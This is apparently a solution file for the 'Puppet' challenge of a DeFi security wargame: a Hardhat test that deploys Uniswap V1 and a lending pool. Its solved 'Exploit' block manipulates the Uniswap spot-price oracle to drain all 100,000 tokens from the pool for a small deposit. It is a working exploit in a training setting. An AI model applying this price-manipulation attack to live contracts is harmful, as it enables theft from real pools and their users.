const exchangeJson = require('../../build-uniswap-v1/UniswapV1Exchange.json');
const factoryJson = require('../../build-uniswap-v1/UniswapV1Factory.json');

const { ethers } = require('hardhat');
const { expect } = require('chai');

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
// i.e., we are selling DVT tokens to get ETH
// Assuming that 'x', 'y' represents amount of token A, B in pool, we have (x + Δx)(y - Δy) = xy (i.e., seller sells Δx tokens of A to buy Δy tokens of B). But if we accommodate fees, this gets modified to (x + 0.997Δx)(y - Δy) = xy (https://hackmd.io/@HaydenAdams/HJ9jLsfTz?type=view#Example-ETH-%E2%86%92-OMG, their example has a slight error, fee is 1/400 & not 1/500). So, Δy = y - xy/(x + .997Δx) = 0.997*Δx*y/(x + .997Δx) = 997*Δx*y/(1000x + 997Δx)
// from the whitepaper: "The fee is now added back into the liquidity pool, which acts as a payout to liquidity providers that is collected when liquidity is removed from the market. Since the fee is added after price calculation, the invariant increases slightly with every trade, making the system profitable for liquidity providers. In fact, what the invariant really represents is ETH_pool * OMG_pool at the end of the previous trade." So, in the above example, new invariant is (x + Δx)(y - Δy) and not (x + .997Δx)(y - Δy).
function calculateTokenToEthInputPrice(
  tokensSold,
  tokensInReserve,
  etherInReserve
) {
  return tokensSold
    .mul(ethers.BigNumber.from('997'))
    .mul(etherInReserve)
    .div(
      tokensInReserve
        .mul(ethers.BigNumber.from('1000'))
        .add(tokensSold.mul(ethers.BigNumber.from('997')))
    );
}

describe('[Challenge] Puppet', function () {
  let deployer, attacker;

  // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
  const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
  const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');

  const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
  const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
  const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000');

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const UniswapExchangeFactory = new ethers.ContractFactory(
      exchangeJson.abi,
      exchangeJson.evm.bytecode,
      deployer
    );
    const UniswapFactoryFactory = new ethers.ContractFactory(
      factoryJson.abi,
      factoryJson.evm.bytecode,
      deployer
    );

    const DamnValuableTokenFactory = await ethers.getContractFactory(
      'DamnValuableToken',
      deployer
    );
    const PuppetPoolFactory = await ethers.getContractFactory(
      'PuppetPool',
      deployer
    );

    await ethers.provider.send('hardhat_setBalance', [
      attacker.address,
      '0x15af1d78b58c40000', // 25 ETH
    ]);
    expect(await ethers.provider.getBalance(attacker.address)).to.equal(
      ATTACKER_INITIAL_ETH_BALANCE
    );

    // Deploy token to be traded in Uniswap
    this.token = await DamnValuableTokenFactory.deploy();

    // Deploy a exchange that will be used as the factory template
    this.exchangeTemplate = await UniswapExchangeFactory.deploy();

    // Deploy factory, initializing it with the address of the template exchange
    this.uniswapFactory = await UniswapFactoryFactory.deploy();
    await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);

    // Create a new exchange for the token, and retrieve the deployed exchange's address
    let tx = await this.uniswapFactory.createExchange(this.token.address, {
      gasLimit: 1e6,
    });
    const { events } = await tx.wait();
    this.uniswapExchange = UniswapExchangeFactory.attach(
      events[0].args.exchange
    );

    // Deploy the lending pool
    this.lendingPool = await PuppetPoolFactory.deploy(
      this.token.address,
      this.uniswapExchange.address
    );

    // Add initial token and ETH liquidity to the pool
    await this.token.approve(
      this.uniswapExchange.address,
      UNISWAP_INITIAL_TOKEN_RESERVE
    );
    await this.uniswapExchange.addLiquidity(
      0, // min_liquidity
      UNISWAP_INITIAL_TOKEN_RESERVE,
      (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
      { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
    );

    // Ensure Uniswap exchange is working as expected
    expect(
      await this.uniswapExchange.getTokenToEthInputPrice(
        ethers.utils.parseEther('1'),
        { gasLimit: 1e6 }
      )
    ).to.be.eq(
      calculateTokenToEthInputPrice(
        ethers.utils.parseEther('1'),
        UNISWAP_INITIAL_TOKEN_RESERVE,
        UNISWAP_INITIAL_ETH_RESERVE
      )
    );

    // Setup initial token balances of pool and attacker account
    await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
    await this.token.transfer(
      this.lendingPool.address,
      POOL_INITIAL_TOKEN_BALANCE
    );

    // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
    expect(
      await this.lendingPool.calculateDepositRequired(
        ethers.utils.parseEther('1')
      )
    ).to.be.eq(ethers.utils.parseEther('2'));

    expect(
      await this.lendingPool.calculateDepositRequired(
        POOL_INITIAL_TOKEN_BALANCE
      )
    ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
  });

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    await this.token
      .connect(attacker)
      .approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
    // now to sell our DVT tokens, refer abi & https://docs.uniswap.org/protocol/V1/reference/exchange
    let tx = await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
      ATTACKER_INITIAL_TOKEN_BALANCE,
      ethers.utils.parseEther('9.9'), // minimum desired
      (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline)
      { gasLimit: 1e6 }
    );
    let receipt = await tx.wait();
    const ethBought = receipt.events.pop().args['eth_bought']; // according to the formula, this should be 9.90069513406156901688 ETH which is what we exactly get too in below log.
    console.log('Eth bought: ', ethers.utils.formatEther(ethBought));
    console.log(
      'Attackers balance: ',
      ethers.utils.formatUnits(
        await ethers.provider.getBalance(attacker.address),
        'ether'
      )
    );
    console.log(
      'Eth now required to get all tokens from pool: ',
      ethers.utils.formatEther(
        await this.lendingPool.calculateDepositRequired(
          POOL_INITIAL_TOKEN_BALANCE
        )
      )
    );
    await this.lendingPool
      .connect(attacker)
      .borrow(POOL_INITIAL_TOKEN_BALANCE, {
        value: ethers.utils.parseEther('20'),
      });

    console.log(
      'Attacker ETH balance after calling borrow function',
      ethers.utils.formatEther(
        await ethers.provider.getBalance(attacker.address),
        'ether'
      )
    );
    // below test requires that we have more than 'POOL_INITIAL_TOKEN_BALANCE', so either could have sold less, like 999 tokens or could now buy more.
    tx = await this.uniswapExchange.connect(attacker).ethToTokenSwapOutput(
      ethers.utils.parseEther('1'), // I desire only 1 extra
      (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline)
      { value: ethers.utils.parseEther('1'), gasLimit: 1e6 }
    );
    await tx.wait();
    console.log(
      'Attacker ETH balance after buying 1 more DVT token',
      ethers.utils.formatEther(
        await ethers.provider.getBalance(attacker.address),
        'ether'
      )
    );
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(this.lendingPool.address)).to.be.eq('0');
    expect(await this.token.balanceOf(attacker.address)).to.be.gt(
      POOL_INITIAL_TOKEN_BALANCE
    );
  });
});
